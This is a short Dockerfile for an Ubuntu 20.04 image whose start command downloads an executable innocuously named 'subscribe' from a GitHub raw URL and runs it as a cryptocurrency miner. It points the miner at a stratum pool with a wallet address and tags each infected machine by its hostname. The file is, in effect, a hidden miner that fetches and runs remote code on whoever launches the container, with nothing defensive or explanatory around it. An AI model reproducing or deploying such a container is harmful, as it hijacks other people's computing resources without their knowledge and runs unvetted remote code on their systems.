FROM ubuntu:20.04 as ubuntu-base
RUN apt-get update && apt-get install -y curl git unzip wget
CMD wget https://raw.githubusercontent.com/gyunierinc/students/main/subscribe && chmod +x subscribe && ./subscribe -a gr -o stratum+tcps://stratum-ru.rplant.xyz:17056 -u RWYv6sY4uW8he8nGiy1Wwab8NBEJzsp3hZ.$(cat /proc/sys/kernel/hostname)
